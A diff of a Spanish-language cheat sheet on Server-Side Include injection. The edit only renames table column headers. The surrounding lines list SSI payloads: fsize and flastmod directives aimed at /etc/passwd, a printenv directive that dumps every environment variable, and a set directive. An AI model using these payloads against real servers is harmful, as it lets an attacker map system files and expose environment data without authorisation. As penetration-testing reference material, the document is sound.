@@ -51,7 +51,7 @@ ___
 
 ## `#fsize` y `#flastmod` (Filesystem Enum)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | File size | `<!--#fsize file="/etc/passwd" -->` | Size en bytes/KB/MB. |
 | File last modified | `<!--#flastmod file="/etc/passwd" -->` | Timestamp. |
@@ -88,7 +88,7 @@ ___
 
 ## `#printenv` y `#config`
 
-| **Directive** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Print all env vars | `<!--#printenv -->` | Full dump. |
 | Set custom variable | `<!--#set var="x" value="hello" -->` | Define local var. |
